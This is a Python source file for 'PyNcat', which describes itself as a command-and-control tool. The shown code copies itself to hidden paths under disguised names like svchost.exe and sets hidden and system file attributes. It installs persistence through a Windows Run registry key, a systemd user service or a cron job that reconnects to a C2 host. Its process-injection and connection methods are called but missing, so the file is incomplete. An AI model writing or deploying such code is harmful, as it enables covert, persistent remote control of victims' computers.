#!/usr/bin/env python3
"""
PyNcat - Professional C2 with SSL, Persistence & Process Injection
"""

import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import time
import random
import ssl
import os
import platform
from typing import Optional, Tuple

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        self.ssl_context: Optional[ssl.SSLContext] = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(description="PyNcat - Professional C2", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode')
        group.add_argument('-c', '--connect', type=str, help='Target IP')

        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        parser.add_argument('--ssl', action='store_true', help='Enable SSL')
        parser.add_argument('--persistent', action='store_true', help='Enable persistence')
        parser.add_argument('--persist-method', choices=['auto', 'registry', 'cron', 'systemd'], default='auto',
                            help='Persistence method')
        
        # ... (keep your existing arguments: --inject-pid, --file, etc.)

        parser.add_argument('-v', '--verbose', action='store_true')
        return parser.parse_args()

        # ====================== PERSISTENCE ======================
    def self_copy_to_hidden(self) -> str:
        """Copy itself to hidden location + apply +H +S attributes on Windows"""
        original_path = os.path.abspath(sys.argv[0])
        system = platform.system().lower()

        try:
            if system == "windows":
                hidden_dir = os.path.join(os.getenv('APPDATA', ''), r"Microsoft\Windows\Themes")
                os.makedirs(hidden_dir, exist_ok=True)
                
                # More stealthy name
                new_name = "SystemUpdate.exe" if original_path.lower().endswith(('.py','.pyc')) else "svchost.exe"
                hidden_path = os.path.join(hidden_dir, new_name)

            elif system == "linux":
                hidden_dir = os.path.expanduser("~/.config/.system")
                os.makedirs(hidden_dir, exist_ok=True)
                new_name = ".dbus-update" if original_path.lower().endswith(('.py','.pyc')) else ".systemd"
                hidden_path = os.path.join(hidden_dir, new_name)
            else:
                return original_path

            import shutil
            if os.path.exists(hidden_path):
                os.remove(hidden_path)

            shutil.copy2(original_path, hidden_path)

            # === FILE ATTRIBUTE HIDING ===
            if system == "windows":
                try:
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    # +H (Hidden) +S (System)
                    kernel32.SetFileAttributesW(hidden_path, 0x2 | 0x4)  
                    logger.info(f"[+] Applied Hidden + System attributes to: {hidden_path}")
                except Exception as e:
                    logger.warning(f"Could not set file attributes: {e}")

            elif system == "linux":
                os.chmod(hidden_path, 0o755)

            logger.info(f"[+] Self-copied to stealthy location: {hidden_path}")
            return hidden_path

        except Exception as e:
            logger.error(f"Self-copy failed: {e}")
            return original_path

    def install_persistence(self):
        """Install persistence pointing to the HIDDEN copy"""
        if not self.args.persistent:
            return

        # Step 1: Self-copy first
        hidden_binary = self.self_copy_to_hidden()

        # Step 2: Get correct C2 address
        c2_ip = self.args.connect or self._get_public_ip() or "127.0.0.1"
        c2_port = self.args.port

        base_cmd = f'"{hidden_binary}" -c {c2_ip} -p {c2_port} --ssl --persistent'

        logger.info(f"[*] Installing persistence using hidden binary → {c2_ip}:{c2_port}")

        system = platform.system().lower()

        if system == "windows":
            self._windows_persistence(hidden_binary, base_cmd)
        elif system == "linux":
            self._linux_persistence(hidden_binary, base_cmd)
        else:
            logger.warning("[!] Persistence not supported on this platform")

    def _windows_persistence(self, binary_path: str, cmd: str):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
            logger.info("[+] Windows Registry persistence installed (points to hidden copy)")
        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")

    def _linux_persistence(self, binary_path: str, cmd: str):
        try:
            # systemd user service
            service_path = f"{os.path.expanduser('~')}/.config/systemd/user/pyncat.service"
            os.makedirs(os.path.dirname(service_path), exist_ok=True)

            service = f"""[Unit]
Description=System Maintenance Service

[Service]
ExecStart={cmd}
Restart=always
RestartSec=7

[Install]
WantedBy=default.target
"""
            with open(service_path, "w") as f:
                f.write(service)

            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True)
            logger.info("[+] Linux systemd persistence installed (hidden binary)")
        except:
            # Cron fallback
            try:
                cron_cmd = f"*/3 * * * * {cmd} >/dev/null 2>&1"
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
                logger.info("[+] Linux cron persistence installed")
            except Exception as e:
                logger.error(f"Cron persistence failed: {e}")

    def _get_public_ip(self):
        try:
            import urllib.request
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as r:
                return r.read().decode().strip()
        except:
            return None
    # ====================== RUN ======================
    def run(self):
        # Process Injection (highest priority)
        if self.args.inject_pid:
            if self.args.inject_shellcode:
                self.inject_shellcode(self.args.inject_pid, self.args.inject_shellcode)
            elif self.args.inject_dll:
                self.inject_dll(self.args.inject_pid, self.args.inject_dll)
            return

        # Install persistence BEFORE connecting
        if self.args.persistent:
            self.install_persistence()

        # Normal C2 Operation
        if self.args.listen:
            self.listen()
        else:
            if self.args.persistent:
                self.connect_persistent()
            else:
                self.connect_once()

if __name__ == "__main__":
    try:
        pyncat = PyNcat()
        pyncat.run()
    except KeyboardInterrupt:
        print("\n[!] PyNcat terminated.")
    except Exception as e:
        logger.error(f"Critical error: {e}")
